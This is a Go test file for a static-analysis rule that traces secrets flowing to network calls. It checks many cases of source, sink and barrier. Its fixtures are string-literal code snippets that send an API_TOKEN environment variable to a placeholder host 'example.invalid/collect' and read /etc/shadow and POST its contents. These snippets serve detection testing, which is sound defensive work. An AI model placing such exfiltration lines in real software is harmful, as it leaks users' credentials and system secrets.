package golang_test

import (
	"strings"
	"testing"
)

func TestGoLocalFlow(t *testing.T) {
	prefix := `package p; import("os";"net/http";"strings";"bytes";"net/url"); func f(flag bool){`
	sink := `http.Post("https://example.invalid/collect","text/plain",strings.NewReader(token))`
	for _, tc := range []struct {
		name, body string
		want       int
	}{
		{name: "var-declaration", body: `var token = os.Getenv("API_TOKEN");` + sink, want: 1},
		{
			name: "multi-var-declaration",
			body: `var token, spare = os.Getenv("API_TOKEN"), "public"; _ = spare;` + sink,
			want: 1,
		},
		{
			name: "form-composite",
			body: `token:=os.Getenv("API_TOKEN");http.PostForm("x",url.Values{"key":{token}})`,
			want: 1,
		},
		{
			name: "arbitrary-composite",
			body: `token:=os.Getenv("API_TOKEN");body:=struct{value string}{token};http.Post("x","x",body)`,
			want: 0,
		},
		{
			name: "composite-mutation",
			body: `token:=os.Getenv("API_TOKEN");_=map[string]string{"key":mutate()};` + sink,
			want: 0,
		},
		{name: "index-mutation", body: `token:=os.Getenv("API_TOKEN");_=token[mutate()];` + sink, want: 0},
		{name: "slice-mutation", body: `token:=os.Getenv("API_TOKEN");_=token[0:mutate()];` + sink, want: 0},
		{name: "assertion-mutation", body: `token:=os.Getenv("API_TOKEN");_=mutate().(string);` + sink, want: 0},
		{name: "unary-mutation", body: `token:=os.Getenv("API_TOKEN");_=!mutate();` + sink, want: 0},
		{name: "deferred-mutation", body: `token:=os.Getenv("API_TOKEN");defer mutate();` + sink, want: 0},
		{name: "concurrent-mutation", body: `token:=os.Getenv("API_TOKEN");go mutate();` + sink, want: 0},
		{name: "both-return", body: `token:=os.Getenv("API_TOKEN");if flag{return}else{return};` + sink, want: 0},
		{name: "assignment", body: `token:=os.Getenv("API_TOKEN");` + sink, want: 1},
		{
			name: "reader-variable",
			body: `token:=os.Getenv("API_TOKEN"); body:=strings.NewReader(token); http.Post("x","x",body)`,
			want: 1,
		},
		{name: "overwrite", body: `token:=os.Getenv("API_TOKEN");token="public";` + sink, want: 0},
		{
			name: "multi-overwrite",
			body: `token:=os.Getenv("API_TOKEN");token,other:="public","text";_ = other;` + sink,
			want: 0,
		},
		{name: "lookup", body: `token,ok:=os.LookupEnv("API_TOKEN");_=ok;` + sink, want: 1},
		{
			name: "error-not-secret",
			body: `token,ok:=os.LookupEnv("API_TOKEN");_=token; http.Post("x","x",strings.NewReader(ok))`,
			want: 0,
		},
		{
			name: "file-read",
			body: `token,err:=os.ReadFile("/etc/shadow");_=err;http.Post("x","x",bytes.NewReader(token))`,
			want: 1,
		},
		{name: "ordinary", body: `token:=os.Getenv("LANG");` + sink, want: 0},
		{name: "branch-possible", body: `token:="public";if flag{token=os.Getenv("TOKEN")};` + sink, want: 1},
		{name: "both-overwrite", body: `token:=os.Getenv("TOKEN");if flag{token="a"}else{token="b"};` + sink, want: 0},
		{
			name: "guard",
			body: `token,err:=os.ReadFile("/etc/shadow");if err!=nil{return};http.Post("x","x",bytes.NewReader(token))`,
			want: 1,
		},
		{name: "terminated", body: `token:=os.Getenv("TOKEN");return;` + sink, want: 0},
		{name: "branch-terminated", body: `token:="public";if flag{token=os.Getenv("TOKEN");return};` + sink, want: 0},
		{name: "block-shadow", body: `token:="public";{token:=os.Getenv("TOKEN");_=token};` + sink, want: 0},
		{name: "block-outer-preserved", body: `token:=os.Getenv("TOKEN");{token:="public";_=token};` + sink, want: 1},
		{
			name: "malformed-source-call-barrier",
			body: `token:=os.Getenv("TOKEN");os.Getenv("name","extra");` + sink,
			want: 0,
		},
		{name: "malformed-file-source-barrier", body: `token:=os.Getenv("TOKEN");os.ReadFile();` + sink, want: 0},
		{name: "unknown-sanitizer", body: `token:=redact(os.Getenv("TOKEN"));` + sink, want: 0},
		{name: "unknown-mutator", body: `token:=os.Getenv("TOKEN");mutate(&token);` + sink, want: 0},
		{name: "hidden-mutator", body: `token:=os.Getenv("TOKEN");_=mutate().Field;` + sink, want: 0},
		{name: "loop-barrier", body: `token:=os.Getenv("TOKEN");for flag{token="public"};` + sink, want: 0},
		{name: "direct-not-duplicated", body: `http.Post("x","x",strings.NewReader(os.Getenv("TOKEN")))`, want: 0},
		{name: "url-flow", body: `token:=os.Getenv("TOKEN");http.Get("https://example.invalid/?t="+token)`, want: 1},
		{
			name: "unknown-object-method",
			body: `token:=os.Getenv("TOKEN");client.Post("x","x",strings.NewReader(token))`,
			want: 0,
		},
		{name: "concatenation", body: `token:=os.Getenv("TOKEN");token="Bearer "+token;` + sink, want: 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			text := prefix + tc.body + "}"
			r := goResult(t, "GO004", text, 20)
			if len(r.Matches) != tc.want || r.Truncated {
				t.Fatalf("want %d got %+v", tc.want, r)
			}
			for _, m := range r.Matches {
				if len(m.Trace) < 3 || len(m.Trace) > 8 || m.Trace[0].Role != "source" || m.Trace[len(m.Trace)-1].Role != "sink" {
					t.Fatal(m)
				}
				for _, s := range m.Trace {
					if s.Start < 0 || s.End > len(text) || s.Start >= s.End {
						t.Fatal(s)
					}
				}
			}
		})
	}
	shadow := `package p; import("os";"net/http";"strings");func f(os interface{Getenv(string)string}){token:=os.Getenv("TOKEN");` + sink + `}`
	if len(goResult(t, "GO004", shadow, 10).Matches) != 0 {
		t.Fatal("shadowed source")
	}
}

func TestGoFlowLimits(t *testing.T) {
	source := `package p;import("os";"net/http";"strings");func f(){token:=os.Getenv("TOKEN");`
	sink := `http.Post("x","x",strings.NewReader(token));`
	r := goResult(t, "GO004", source+sink+sink+"}", 1)
	if len(r.Matches) != 1 || !r.Truncated {
		t.Fatal(r)
	}
	r = goResult(t, "GO004", source+strings.Repeat(`token="prefix"+token;`, 20)+sink+"}", 10)
	if !r.Truncated {
		t.Fatal("trace work limit not surfaced")
	}
}
